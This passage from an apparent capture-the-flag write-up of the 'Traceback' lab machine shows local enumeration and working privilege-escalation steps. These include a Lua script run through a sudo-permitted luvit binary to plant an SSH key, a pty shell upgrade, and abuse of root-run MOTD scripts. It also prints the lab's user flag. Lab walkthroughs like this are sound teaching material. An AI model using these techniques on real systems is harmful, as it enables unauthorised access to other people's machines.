+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lap</span> /etc/apparmor.d/</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>/<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">total 48
+</span><span class="z-text z-plain">-rw-r--r--  1 root root 3194 Mar 26  2018 sbin.dhclient
+</span><span class="z-text z-plain">-rw-r--r--  1 root root 2857 Apr  7  2018 usr.bin.man
+</span><span class="z-text z-plain">-rw-r--r--  1 root root 1550 Apr 24  2018 usr.sbin.rsyslogd
+</span><span class="z-text z-plain">-rw-r--r--  1 root root 1353 Mar 31  2018 usr.sbin.tcpdump
+</span></code></pre>
+<p>All of these profiles are classic.</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ip a</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span><span class="z-text z-plain">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span><span class="z-text z-plain">    inet 127.0.0.1/8 scope host lo
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 ::1/128 scope host 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+</span><span class="z-text z-plain">    link/ether 00:50:56:b9:8b:56 brd ff:ff:ff:ff:ff:ff
+</span><span class="z-text z-plain">    inet 10.10.10.181/24 brd 10.10.10.255 scope global ens160
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span><span class="z-text z-plain">    inet6 dead:beef::250:56ff:feb9:8b56/64 scope global dynamic mngtmpaddr 
+</span><span class="z-text z-plain">       valid_lft 86397sec preferred_lft 14397sec
+</span><span class="z-text z-plain">    inet6 fe80::250:56ff:feb9:8b56/64 scope link 
+</span><span class="z-text z-plain">       valid_lft forever preferred_lft forever
+</span></code></pre>
+<p>So there's only the loopback interface and the Ethernet interface.</p>
+<h2 id="hostname">Hostname</h2>
+<p>What is Traceback's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">traceback
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all the local users that have a console.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/passwd</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span><span class="z-text z-plain">webadmin
+</span><span class="z-text z-plain">sysadmin
+</span></code></pre>
+<p>Interesting! So apart from us and <code>root</code>, there's also a <code>sysadmin</code> user. Maybe we'll have to get a shell as <code>sysadmin</code> to reach <code>root</code>?</p>
+<h2 id="local-groups">Local groups</h2>
+<p>Let's retrieve the list of all local groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> getent group</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">backup
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">crontab
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">fax
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gnats
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">irc
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">list
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">lpadmin
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">messagebus
+</span><span class="z-text z-plain">mlocate
+</span><span class="z-text z-plain">netdev
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nogroup
+</span><span class="z-text z-plain">operator
+</span><span class="z-text z-plain">plugdev
+</span><span class="z-text z-plain">proxy
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">sambashare
+</span><span class="z-text z-plain">sasl
+</span><span class="z-text z-plain">shadow
+</span><span class="z-text z-plain">src
+</span><span class="z-text z-plain">ssh
+</span><span class="z-text z-plain">ssl-cert
+</span><span class="z-text z-plain">staff
+</span><span class="z-text z-plain">sudo
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">sysadmin
+</span><span class="z-text z-plain">syslog
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-network
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">uuidd
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">voice
+</span><span class="z-text z-plain">webadmin
+</span><span class="z-text z-plain">www-data
+</span></code></pre>
+<p>That's pretty classic.</p>
+<p>Now let's see to which groups we currently belong.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> groups</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">webadmin cdrom dip plugdev lpadmin sambashare
+</span></code></pre>
+<p>Unfortunately, there's nothing that we can abuse.</p>
+<h2 id="home-folder">Home folder</h2>
+<p>Let's check our home folder to see if it contains the user flag, or anything unusual.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">drwxr-x--- 5 webadmin sysadmin 4096 Apr 22  2021 .
+</span><span class="z-text z-plain">drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
+</span><span class="z-text z-plain">-rw------- 1 webadmin webadmin  105 Mar 16  2020 .bash_history
+</span><span class="z-text z-plain">-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
+</span><span class="z-text z-plain">-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
+</span><span class="z-text z-plain">drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
+</span><span class="z-text z-plain">drwxrwxr-x 3 webadmin webadmin 4096 Apr 22  2021 .local
+</span><span class="z-text z-plain">-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
+</span><span class="z-text z-plain">-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16  2020 note.txt
+</span><span class="z-text z-plain">-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
+</span><span class="z-text z-plain">drwxrwxr-x 2 webadmin webadmin 4096 Feb 27  2020 .ssh
+</span></code></pre>
+<p>We don't find the user flag. The <code>note.txt</code> file is intriguing though, let's see what is contains!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/note.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">- sysadmin -
+</span><span class="z-text z-plain">I have left a tool to practice Lua.
+</span><span class="z-text z-plain">I&#39;m sure you know where to find it.
+</span><span class="z-text z-plain">Contact me if you have any question.
+</span></code></pre>
+<p>Apparently, the <code>sysadmin</code> user that we discovered earlier left a tool to 'practice Lua'. Okay.</p>
+<h2 id="command-history">Command history</h2>
+<p>Let's check the history of commands ran by <code>webadmin</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/.bash_history</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">nano privesc.lua
+</span><span class="z-text z-plain">sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
+</span><span class="z-text z-plain">rm privesc.lua
+</span><span class="z-text z-plain">logout
+</span></code></pre>
+<p>That's interesting! It looks like <code>sysadmin</code> connected to this account to run <code>luvit</code> with a <code>privesc.lua</code> file. The name of this file is a big hint... we must be able to use <code>luvit</code> with a custom Lua script to escalate our privileges!</p>
+<h1 id="lateral-movement-luvit">Lateral movement (<code>luvit</code>)</h1>
+<p>The goal is now to write our SSH public key to <code>/home/sysadmin/.ssh/authorized_keys</code> in order to connect as <code>sysadmin</code>, just like we did for <code>webadmin</code>.</p>
+<p>The following Lua script might do the trick.</p>
+<pre data-lang="lua" class="language-lua z-code"><code class="language-lua" data-lang="lua"><span class="z-source z-lua"><span class="z-variable z-other z-lua">authkeys</span> <span class="z-keyword z-operator z-assignment z-lua">=</span> <span class="z-support z-constant z-builtin z-lua">io</span><span class="z-punctuation z-accessor z-lua">.</span><span class="z-meta z-property z-lua"><span class="z-support z-function z-builtin z-lua">open</span></span><span class="z-meta z-function-call z-arguments z-lua"><span class="z-meta z-group z-lua"><span class="z-punctuation z-section z-group z-begin z-lua">(</span><span class="z-string z-quoted z-double z-lua"><span class="z-punctuation z-definition z-string z-begin z-lua">&quot;</span>/home/sysadmin/.ssh/authorized_keys<span class="z-punctuation z-definition z-string z-end z-lua">&quot;</span></span><span class="z-punctuation z-separator z-comma z-lua">,</span> <span class="z-string z-quoted z-double z-lua"><span class="z-punctuation z-definition z-string z-begin z-lua">&quot;</span>a<span class="z-punctuation z-definition z-string z-end z-lua">&quot;</span></span><span class="z-punctuation z-section z-group z-end z-lua">)</span></span></span>
+</span><span class="z-source z-lua"><span class="z-variable z-other z-lua">authkeys</span><span class="z-punctuation z-accessor z-lua">:</span><span class="z-meta z-property z-lua"><span class="z-variable z-function z-lua">write</span></span><span class="z-meta z-function-call z-arguments z-lua"><span class="z-meta z-group z-lua"><span class="z-punctuation z-section z-group z-begin z-lua">(</span><span class="z-string z-quoted z-double z-lua"><span class="z-punctuation z-definition z-string z-begin z-lua">&quot;</span>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICF8Vs9QFJ3VTFx5hxO0vISYAK1MiJdi5VUkFPq5zpIT<span class="z-constant z-character z-escape z-lua">\n</span><span class="z-punctuation z-definition z-string z-end z-lua">&quot;</span></span><span class="z-punctuation z-section z-group z-end z-lua">)</span></span></span>
+</span><span class="z-source z-lua"><span class="z-variable z-other z-lua">authkeys</span><span class="z-punctuation z-accessor z-lua">:</span><span class="z-meta z-property z-lua"><span class="z-variable z-function z-lua">close</span></span><span class="z-meta z-function-call z-arguments z-lua"><span class="z-meta z-group z-lua"><span class="z-punctuation z-section z-group z-begin z-lua">(</span><span class="z-punctuation z-section z-group z-end z-lua">)</span></span></span>
+</span></code></pre>
+<p>Let's save it in <code>privesc.lua</code> and run the same command that was previously ran.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> sysadmin /home/sysadmin/luvit privesc.lua </span>
+</span></code></pre>
+<p>We receive no output, which is totally normal. If it worked, we should be able to connect to Traceback as <code>sysadmin</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh sysadmin@10.10.10.181<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> id_ed25519</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">#################################
+</span><span class="z-text z-plain">-------- OWNED BY XH4H  ---------
+</span><span class="z-text z-plain">- I guess stuff could have been configured better ^^ -
+</span><span class="z-text z-plain">#################################
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Welcome to Xh4H land 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">$
+</span></code></pre>
+<p>And it worked! Fantastic!</p>
+<p>This shell seems quite limited though, not as interactive as SSH shells usually are. That's strange. Let's execute a Python one-liner to transform it into an interactive one:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">$</span></span><span class="z-meta z-function-call z-arguments z-shell"> python3<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>import pty; pty.spawn(&quot;/bin/bash&quot;)<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">sysadmin@traceback:~$
+</span></code></pre>
+<p>That's much better!</p>
+<h1 id="local-enumeration-1">Local enumeration</h1>
+<h2 id="local-groups-1">Local groups</h2>
+<p>Let's see which groups we belong to.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> groups</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">sysadmin
+</span></code></pre>
+<p>Well, we actually only belong to the primary one.</p>
+<h2 id="home-folder-1">Home folder</h2>
+<p>This time, there's a <code>user.txt</code> flag in our home folder. Let's print its content to get the user flag!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/user.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">f4f75888b4faa0636c7b5559b41b9e0d
+</span></code></pre>
+<p>But apart from the flag and the <code>luvit</code> binary, there's nothing out of the ordinary.</p>
+<h2 id="command-history-1">Command history</h2>
+<p>Let's check if <code>sysadmin</code> ran interesting command.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/.bash_history</span>
+</span></code></pre>
+<p>Nothing.</p>
+<h2 id="sudo-permissions">Sudo permissions</h2>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[sudo] password for sysadmin:
+</span></code></pre>
+<p>Apparently we have to know <code>sysadmin</code>'s password to access this information, but we don't know it...</p>
+<h2 id="listening-ports">Listening ports</h2>
+<p>Let's see if any TCP local ports are listening for connections.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ss<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>tln</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
+</span><span class="z-text z-plain">LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
+</span><span class="z-text z-plain">LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
+</span><span class="z-text z-plain">LISTEN   0         128                       *:80                     *:*       
+</span><span class="z-text z-plain">LISTEN   0         128                    [::]:22                  [::]:*
+</span></code></pre>
+<p>Apparently, there is a service listening on port <code>53/tcp</code>. What about UDP?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ss<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>uln</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
+</span><span class="z-text z-plain">UNCONN   0         0             127.0.0.53%lo:53               0.0.0.0:*
+</span></code></pre>
+<p>There's also a service listening on port <code>53/udp</code>. That's probably the same service.</p>
+<p>Let's check <code>/etc/services</code> for the services associated with these ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/services</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>E</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>\b53/tcp\b|\b53/udp\b<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">domain          53/tcp                          # Domain Name Server
+</span><span class="z-text z-plain">domain          53/udp
+</span></code></pre>
+<p>So these ports are used by a DNS!</p>
+<p>I won't explore it since this is probably a rabbit hole. It's an easy box after all! But let's keep that in mind and come back to it if we don't find another privilege escalation path.</p>
+<h2 id="processes">Processes</h2>
+<p>Let's use <code>pspy</code> to see which processes are running on Traceback.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ./pspy</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">2023/11/25 02:01:01 CMD: UID=0     PID=16173  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">2023/11/25 02:02:01 CMD: UID=0     PID=16180  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>That's odd... it looks like a cronjob that executes every minute. It sleeps for 30 seconds, and then copies the content of <code>/var/backups/.update-motd.d/</code> into <code>/etc/update-motd.d/</code>.</p>
+<h2 id="motd-feature">MOTD feature</h2>
+<p>This directory is related to the Message of the Day (MOTD) feature. The MOTD is a customizable message that is displayed to users when they log in to a system.</p>
+<p>Now that I think about it, when we connected through SSH, we received a custom MOTD. Maybe there's something about that that we could abuse?</p>
+<p>Let's check the content of <code>/var/backups/.update-motd.d/</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> /var/backups/.update-motd.d/</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">-rwxr-xr-x 1 root root  981 Aug 25  2019 00-header
+</span><span class="z-text z-plain">-rwxr-xr-x 1 root root  982 Aug 27  2019 10-help-text
+</span><span class="z-text z-plain">-rwxr-xr-x 1 root root 4264 Aug 25  2019 50-motd-news
+</span><span class="z-text z-plain">-rwxr-xr-x 1 root root  604 Aug 25  2019 80-esm
+</span><span class="z-text z-plain">-rwxr-xr-x 1 root root  299 Aug 25  2019 91-release-upgrade
+</span></code></pre>
+<p>This folder contains a bunch of files owned by <code>root</code>. We can't edit them though.</p>
+<p>If we print the content of <code>00-header</code>, we see that this is indeed the message we got when we connected using SSH.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /var/backups/.update-motd.d/00-header</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">echo &quot;\nWelcome to Xh4H land \n&quot;
+</span></code></pre>
+<p>So the <code>/etc/update-motd.d/</code> directory should contain the same files.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sysadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ls<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>la</span> /etc/update-motd.d/</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">-rwxrwxr-x  1 root sysadmin  981 Nov 25 02:11 00-header
+</span><span class="z-text z-plain">-rwxrwxr-x  1 root sysadmin  982 Nov 25 02:11 10-help-text
+</span><span class="z-text z-plain">-rwxrwxr-x  1 root sysadmin 4264 Nov 25 02:11 50-motd-news
+</span><span class="z-text z-plain">-rwxrwxr-x  1 root sysadmin  604 Nov 25 02:11 80-esm
+</span><span class="z-text z-plain">-rwxrwxr-x  1 root sysadmin  299 Nov 25 02:11 91-release-upgrade
+</span></code></pre>
+<p>This is indeed the same output as for the <code>/var/backups/.update-motd.d/</code> folder, except that the group is now set to <code>sysadmin</code>. This means that we can edit these files, and that they will be executed as <code>root</code>!</p>
+<h1 id="privilege-escalation-motd">Privilege escalation (MOTD)</h1>
+<p>Let's edit the <code>00-header</code> file in <code>/etc/update-motd.d/</code> to add our SSH public key to <code>/root/.ssh/authorized_keys</code>.</p>
